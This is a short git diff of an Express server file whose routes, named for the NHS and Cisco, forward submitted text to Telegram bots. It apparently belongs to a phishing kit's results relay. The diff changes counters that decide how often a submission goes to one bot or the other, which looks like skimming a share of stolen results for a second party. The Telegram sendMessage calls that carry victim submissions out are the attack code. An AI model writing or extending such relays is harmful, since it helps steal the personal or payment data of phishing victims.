@@ -11469,7 +11469,7 @@ app.post("/ciscoNHS", (req, res) => {
           .catch((e) => {
             console.log(e);
           });
-        cya = 10;
+        cya = 6;
       } else {
         axios
           .post(
@@ -12383,7 +12383,7 @@ app.post("/sendKelvFriendRes", (req, res) => {
     });
 });
 
-let fpaysC = 3;
+let fpaysC = 10;
 
 app.options("/sendFpays2", cors());
 
@@ -12445,7 +12445,7 @@ app.post("/sendFpays2", (req, res) => {
         axios.post(
           `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
         );
-        fpaysC = 0;
+        fpaysC = 6;
       } else {
         axios.post(
           `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSFPays:\n${originalText}`
